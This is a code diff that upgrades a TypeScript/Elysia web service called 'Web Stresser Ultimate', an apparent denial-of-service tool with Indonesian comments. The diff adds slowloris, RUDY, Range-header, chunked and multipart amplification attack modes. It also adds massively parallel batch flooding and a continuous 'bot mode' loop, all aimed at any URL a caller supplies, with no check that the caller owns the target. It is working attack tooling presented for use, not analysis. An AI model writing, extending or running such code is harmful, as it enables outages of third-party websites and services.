@@ -8,16 +8,25 @@ function randomString(n: number): string {
   return result;
 }
 
-function generateAmplificationPayload(kb: number): string {
+function generateAmplificationPayload(kb: number, ampType: string): string {
   if (kb <= 0) return '';
   const size = kb * 1024;
-  const chunk = 'X'.repeat(1024);
-  const repeat = Math.floor(size / chunk.length);
-  const remainder = size % chunk.length;
-  return chunk.repeat(repeat) + chunk.slice(0, remainder);
+  switch (ampType) {
+    case 'range':
+      // Tidak perlu body, cukup header Range
+      return '';
+    case 'chunked':
+      // Untuk chunked, kita return data besar yang akan dipecah
+      return 'X'.repeat(size);
+    case 'multipart':
+      // Untuk multipart, kita gunakan boundary generator di bawah
+      return 'X'.repeat(size);
+    default:
+      return 'X'.repeat(size);
+  }
 }
 
-// Active users counter
+// Active users counter (in-memory)
 const activeUsers = new Map<string, number>();
 setInterval(() => {
   const now = Date.now();
@@ -26,8 +35,8 @@ setInterval(() => {
   }
 }, 30000);
 
-// ==================== Core Attack Function (single request) ====================
-interface AttackParams {
+// ==================== Core Attack (Single) ====================
+interface SingleAttackParams {
   url: string;
   method: string;
   headers: Record<string, string>;
@@ -36,15 +45,17 @@ interface AttackParams {
   retryCount: number;
   randomDelay: number;
   keepAlive: boolean;
-  attackType: string;
+  attackType: string;        // normal, slowloris, rudy, range, chunked, multipart
   amplifyKB: number;
+  amplifyEnabled: boolean;
+  amplifyType: string;       // range, chunked, multipart
 }
 
-async function singleAttack(params: AttackParams): Promise<any> {
+async function singleAttack(params: SingleAttackParams): Promise<any> {
   const {
     url, method, headers, body,
     timeout, retryCount, randomDelay,
-    keepAlive, attackType, amplifyKB,
+    keepAlive, attackType, amplifyKB, amplifyEnabled, amplifyType,
   } = params;
 
   let finalMethod = method.toUpperCase();
@@ -55,8 +66,13 @@ async function singleAttack(params: AttackParams): Promise<any> {
 
   if (randomDelay > 0) await new Promise(r => setTimeout(r, Math.random() * randomDelay));
 
-  const ampPayload = generateAmplificationPayload(amplifyKB);
+  // Amplification payload (jika diaktifkan)
+  let ampPayload = '';
+  if (amplifyEnabled && amplifyKB > 0) {
+    ampPayload = generateAmplificationPayload(amplifyKB, amplifyType);
+  }
 
+  // Tentukan attack type yang dipilih user (bisa berbeda dengan amplifyType)
   switch (attackType) {
     case 'range':
       finalHeaders['Range'] = `bytes=0-${amplifyKB * 1024}`;
@@ -69,7 +85,8 @@ async function singleAttack(params: AttackParams): Promise<any> {
     case 'multipart':
       const boundary = `----WebKitFormBoundary${randomString(16)}`;
       finalHeaders['Content-Type'] = `multipart/form-data; boundary=${boundary}`;
-      finalBody = `--${boundary}\r\nContent-Disposition: form-data; name="file"; filename="amp.txt"\r\nContent-Type: text/plain\r\n\r\n${ampPayload}\r\n--${boundary}--\r\n`;
+      const part = `--${boundary}\r\nContent-Disposition: form-data; name="file"; filename="amp.txt"\r\nContent-Type: text/plain\r\n\r\n${ampPayload}\r\n--${boundary}--\r\n`;
+      finalBody = part;
       useBody = true;
       break;
     case 'slowloris':
@@ -77,19 +94,22 @@ async function singleAttack(params: AttackParams): Promise<any> {
       break;
     case 'rudy':
       await new Promise(r => setTimeout(r, 2000));
-      finalBody = body + ampPayload;
+      if (amplifyEnabled && ampPayload) finalBody = body + ampPayload;
+      else finalBody = body;
       useBody = true;
       break;
-    default:
-      finalBody = body + ampPayload;
+    default: // normal
+      if (amplifyEnabled && ampPayload) finalBody = body + ampPayload;
+      else finalBody = body;
       useBody = true;
   }
 
-  if (amplifyKB > 0 && (finalMethod === 'GET' || finalMethod === 'HEAD') && ampPayload.length > 2048) {
+  // Jika amplification enabled dan method GET/HEAD, ubah ke POST jika payload besar
+  if (amplifyEnabled && amplifyKB > 0 && (finalMethod === 'GET' || finalMethod === 'HEAD') && ampPayload.length > 2048) {
     finalMethod = 'POST';
     useBody = true;
     finalBody = ampPayload;
-  } else if (amplifyKB > 0 && (finalMethod === 'GET' || finalMethod === 'HEAD')) {
+  } else if (amplifyEnabled && amplifyKB > 0 && (finalMethod === 'GET' || finalMethod === 'HEAD') && ampPayload.length <= 2048) {
     const separator = finalUrl.includes('?') ? '&' : '?';
     finalUrl += `${separator}_amp=${encodeURIComponent(ampPayload)}`;
     useBody = false;
@@ -103,7 +123,7 @@ async function singleAttack(params: AttackParams): Promise<any> {
     method: finalMethod,
     headers: finalHeaders,
     signal: AbortSignal.timeout(timeout),
-    redirect: 'manual',  // tidak ikut redirect untuk efisiensi
+    redirect: 'manual',
   };
   if (useBody && (finalMethod === 'POST' || finalMethod === 'PUT' || finalMethod === 'PATCH')) {
     fetchOptions.body = finalBody;
@@ -152,7 +172,7 @@ async function singleAttack(params: AttackParams): Promise<any> {
   };
 }
 
-// ==================== Batch Attack (massive parallel requests) ====================
+// ==================== Batch Attack (massive parallel) ====================
 interface BatchAttackParams {
   url: string;
   method: string;
@@ -164,74 +184,98 @@ interface BatchAttackParams {
   keepAlive: boolean;
   attackType: string;
   amplifyKB: number;
-  concurrency: number;   // jumlah request paralel
-  total: number;         // total request
+  amplifyEnabled: boolean;
+  amplifyType: string;
+  concurrency: number;
+  total: number;
+  continuous: boolean;      // untuk bot mode (loop tanpa henti)
+  intervalMs: number;       // jeda antar loop (jika continuous)
 }
 
 async function batchAttack(params: BatchAttackParams): Promise<any> {
   const {
     url, method, headers, body, timeout, retryCount, randomDelay,
-    keepAlive, attackType, amplifyKB, concurrency, total
+    keepAlive, attackType, amplifyKB, amplifyEnabled, amplifyType,
+    concurrency, total, continuous, intervalMs
   } = params;
 
   const startTime = Date.now();
-  let successCount = 0;
-  let failCount = 0;
+  let totalSuccess = 0;
+  let totalFail = 0;
   let totalBytes = 0;
-  let latencies: number[] = [];
+  let allLatencies: number[] = [];
+  let loopCount = 0;
 
-  // Fungsi untuk menjalankan satu request dengan parameter yang sama
-  const runOne = async () => {
-    const result = await singleAttack({
-      url, method, headers, body, timeout, retryCount, randomDelay,
-      keepAlive, attackType, amplifyKB
-    });
-    if (result.success) successCount++;
-    else failCount++;
-    totalBytes += result.responseSize;
-    latencies.push(result.durationMs);
-    return result;
+  const runBatch = async (targetTotal: number): Promise<{ success: number; fail: number; bytes: number; latencies: number[] }> => {
+    let successCount = 0;
+    let failCount = 0;
+    let bytes = 0;
+    let latencies: number[] = [];
+
+    const runOne = async () => {
+      const result = await singleAttack({
+        url, method, headers, body, timeout, retryCount, randomDelay,
+        keepAlive, attackType, amplifyKB, amplifyEnabled, amplifyType
+      });
+      if (result.success) successCount++;
+      else failCount++;
+      bytes += result.responseSize;
+      latencies.push(result.durationMs);
+    };
+
+    let index = 0;
+    const workers: Promise<void>[] = [];
+    for (let i = 0; i < concurrency; i++) {
+      workers.push(new Promise<void>(async (resolve) => {
+        while (index < targetTotal) {
+          index++;
+          await runOne();
+        }
+        resolve();
+      }));
+    }
+    await Promise.all(workers);
+    return { success: successCount, fail: failCount, bytes, latencies };
   };
 
-  // Batch dengan concurrency control
-  let index = 0;
-  const workers: Promise<any>[] = [];
+  do {
+    const batchResult = await runBatch(total);
+    totalSuccess += batchResult.success;
+    totalFail += batchResult.fail;
+    totalBytes += batchResult.bytes;
+    allLatencies.push(...batchResult.latencies);
+    loopCount++;
 
-  for (let i = 0; i < concurrency; i++) {
-    workers.push(new Promise<void>(async (resolve) => {
-      while (index < total) {
-        index++;
-        await runOne();
-      }
-      resolve();
-    }));
-  }
-  await Promise.all(workers);
+    if (continuous && intervalMs > 0) {
+      await new Promise(r => setTimeout(r, intervalMs));
+    }
+  } while (continuous && loopCount < 9999); // limit loop untuk keamanan
 
   const totalTime = Date.now() - startTime;
-  const avgLatency = latencies.length ? latencies.reduce((a,b)=>a+b,0)/latencies.length : 0;
-  const rps = totalTime > 0 ? (total / (totalTime/1000)).toFixed(2) : 0;
+  const avgLatency = allLatencies.length ? allLatencies.reduce((a,b)=>a+b,0)/allLatencies.length : 0;
+  const rps = totalTime > 0 ? ((totalSuccess+totalFail) / (totalTime/1000)).toFixed(2) : 0;
 
   return {
-    success: true,  // selalu sukses dari sisi backend
-    totalRequests: total,
-    successCount,
-    failCount,
+    success: true,
+    totalRequests: (totalSuccess+totalFail),
+    successCount: totalSuccess,
+    failCount: totalFail,
     totalBytes,
     totalTimeMs: totalTime,
     avgLatencyMs: avgLatency,
     rps,
-    latencies: latencies.slice(0, 100) // batasi ukuran response
+    loopCount,
+    latencies: allLatencies.slice(0, 200),
   };
 }
 
-// ==================== Elysia Server ====================
+// ==================== Elysia App ====================
 export const app = new Elysia()
-  // Error handler → selalu kembalikan JSON 200 OK
+  // Global error handler → tetap 200 OK
   .onError(({ error, set }) => {
-    set.status = 200;   // paksa 200 OK
+    set.status = 200;
     console.error(error);
-    return { success: false, error: error.message, durationMs: 0 };
+    return { success: false, error: error.message };
   })
   .onBeforeHandle(({ request }) => {
     if (request.method === 'OPTIONS') {
@@ -246,15 +290,15 @@ export const app = new Elysia()
   })
   .get('/api/status', () => ({
     status: 'ok',
-    message: 'Web Stresser Ultimate - Extreme Batch Mode',
-    version: '14.0.0',
+    message: 'Web Stresser Ultimate - Elysia Extreme Bot Mode',
+    version: '15.0.0',
   }))
   .post('/api/attack', async ({ body }) => {
     try {
-      const result = await singleAttack(body as AttackParams);
+      const result = await singleAttack(body as SingleAttackParams);
       return result;
     } catch (err: any) {
-      return { success: false, error: err.message, durationMs: 0, statusCode: 0 };
+      return { success: false, error: err.message, durationMs: 0 };
     }
   }, {
     body: t.Object({
@@ -268,15 +312,16 @@ export const app = new Elysia()
       keepAlive: t.Boolean(),
       attackType: t.String(),
       amplifyKB: t.Number(),
+      amplifyEnabled: t.Boolean(),
+      amplifyType: t.String(),
     }),
   })
-  // Batch attack endpoint (lebih berbahaya)
   .post('/api/batch', async ({ body }) => {
     try {
       const result = await batchAttack(body as BatchAttackParams);
       return result;
     } catch (err: any) {
-      return { success: false, error: err.message, totalRequests: 0, successCount: 0, failCount: 0 };
+      return { success: false, error: err.message };
     }
   }, {
     body: t.Object({
@@ -290,8 +335,12 @@ export const app = new Elysia()
       keepAlive: t.Boolean(),
       attackType: t.String(),
       amplifyKB: t.Number(),
+      amplifyEnabled: t.Boolean(),
+      amplifyType: t.String(),
       concurrency: t.Number(),
       total: t.Number(),
+      continuous: t.Boolean(),
+      intervalMs: t.Number(),
     }),
   })
   .get('/api/heartbeat', ({ request }) => {
@@ -302,8 +351,8 @@ export const app = new Elysia()
     return { active: activeUsers.size };
   });
 
-// ==================== Local Run ====================
+// Local run
 if (process.env.NODE_ENV !== 'production') {
   app.listen(3000);
-  console.log('🦊 Extreme Web Stresser running on http://localhost:3000');
+  console.log('🦊 Web Stresser Ultimate running on http://localhost:3000');
 }
